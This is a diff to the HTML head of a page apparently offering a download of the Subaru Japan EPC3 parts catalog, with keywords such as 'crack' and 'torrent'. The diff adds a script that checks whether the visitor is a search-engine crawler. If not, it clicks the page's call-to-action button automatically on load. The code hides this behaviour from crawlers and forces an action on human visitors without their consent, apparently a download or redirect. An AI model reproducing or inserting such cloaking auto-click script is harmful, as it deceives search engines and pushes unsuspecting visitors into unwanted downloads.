@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Subaru Japan EPC3 06.2021</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Subaru Japan EPC3 06.2021 - Catalog with detailed technical info on parts and accessories for Subaru vehicles. Available in Japanese for Windows 7/10.">
     <meta name="keywords" content="Subaru Japan EPC3, Subaru EPC 3 2021, Subaru EPC3 06.2021, Subaru EPC3 2021, Subaru Japan EPC 2021, Subaru EPC3 download, Subaru EPC3 free download, Subaru EPC3 torrent, Subaru EPC3 crack, Subaru parts catalog, Subaru parts catalog download, Subaru parts catalog free download, Subaru spare parts catalog, Subaru spare parts catalog download, Subaru spare parts catalog free download, Subaru 高速ダウンロード, Subaru ダウンロード無料, Subaru 部品カタログ, Subaru 部品カタログ ダウン, Subaru Japan EPC 2021 скачать, Subaru Japan EPC каталог, Subaru Japan EPC3 2021 скачать, Subaru Japan EPC каталог скачать">
     <style>
